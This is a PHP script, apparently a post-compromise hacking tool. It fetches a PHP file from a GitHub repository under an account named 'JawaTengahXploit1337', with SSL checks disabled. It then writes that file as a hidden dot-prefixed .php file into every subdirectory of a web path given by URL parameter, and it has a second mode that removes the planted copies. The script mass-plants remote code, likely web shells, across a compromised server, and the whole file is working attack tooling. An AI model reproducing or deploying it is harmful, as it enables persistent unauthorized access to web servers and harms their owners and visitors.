<?php
// Script Mass Upload/Delete File (Support Windows & Linux)
// Upload: tools.php?dir=C:/xampp/htdocs
// Delete: tools.php?delete=C:/xampp/htdocs

error_reporting(0);
set_time_limit(0);

$file_url = "https://raw.githubusercontent.com/JawaTengahXploit1337/Method/main/lolb.php";

function normalizePath($path) {
    $path = str_replace('\\', '/', $path);
    $path = rtrim($path, '/');
    return $path;
}

function downloadFile($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

function deleteUploadedFiles($base_dir) {
    $result = [];
    $base_dir = normalizePath($base_dir);
    
    if (!is_dir($base_dir)) {
        return ["error" => "Invalid directory"];
    }
    
    $dir_iterator = new RecursiveDirectoryIterator($base_dir, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
    
    foreach ($iterator as $file) {
        if ($file->isDir()) {
            $dir_path = $file->getPathname();
            $dir_name = basename($dir_path);
            $target_file = normalizePath($dir_path) . '/.' . $dir_name . '.php';
            
            if (file_exists($target_file)) {
                if (unlink($target_file)) {
                    $result['deleted'][] = $target_file;
                } else {
                    $result['failed'][] = $target_file;
                }
            }
        }
    }
    return $result;
}

function processDirectories($base_dir) {
    global $file_url;
    $result = [];
    $base_dir = normalizePath($base_dir);
    
    if (!is_dir($base_dir)) {
        return ["error" => "Invalid directory"];
    }
    
    $file_content = downloadFile($file_url);
    if (empty($file_content)) {
        return ["error" => "Failed to download file"];
    }
    
    $dir_iterator = new RecursiveDirectoryIterator($base_dir, RecursiveDirectoryIterator::SKIP_DOTS);
    $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
    
    foreach ($iterator as $file) {
        if ($file->isDir()) {
            $dir_path = $file->getPathname();
            $dir_name = basename($dir_path);
            $target_file = normalizePath($dir_path) . '/.' . $dir_name . '.php';
            
            if (file_put_contents($target_file, $file_content)) {
                $result['uploaded'][] = $target_file;
            } else {
                $result['failed'][] = $target_file;
            }
        }
    }
    return $result;
}

if (isset($_GET['delete']) && !empty($_GET['delete'])) {
    $base_directory = $_GET['delete'];
    $result = deleteUploadedFiles($base_directory);
    
    echo "<h2>Delete Results</h2>";
    echo "<p>Base directory: <strong>".htmlspecialchars($base_directory)."</strong></p>";
    
    if (isset($result['error'])) {
        echo "<div style='color:red;'>".htmlspecialchars($result['error'])."</div>";
    } else {
        echo "<h3>Deleted files:</h3><ul>";
        foreach ($result['deleted'] as $file) {
            echo "<li>".htmlspecialchars($file)."</li>";
        }
        echo "</ul>";
        
        if (!empty($result['failed'])) {
            echo "<h3>Failed to delete:</h3><ul>";
            foreach ($result['failed'] as $file) {
                echo "<li>".htmlspecialchars($file)."</li>";
            }
            echo "</ul>";
        }
    }
} elseif (isset($_GET['dir']) && !empty($_GET['dir'])) {
    $base_directory = $_GET['dir'];
    $result = processDirectories($base_directory);
    
    echo "<h2>Upload Results</h2>";
    echo "<p>Base directory: <strong>".htmlspecialchars($base_directory)."</strong></p>";
    
    if (isset($result['error'])) {
        echo "<div style='color:red;'>".htmlspecialchars($result['error'])."</div>";
    } else {
        echo "<h3>Uploaded files:</h3><ul>";
        foreach ($result['uploaded'] as $file) {
            echo "<li>".htmlspecialchars($file)."</li>";
        }
        echo "</ul>";
        
        if (!empty($result['failed'])) {
            echo "<h3>Failed to upload:</h3><ul>";
            foreach ($result['failed'] as $file) {
                echo "<li>".htmlspecialchars($file)."</li>";
            }
            echo "</ul>";
        }
    }
}
?>
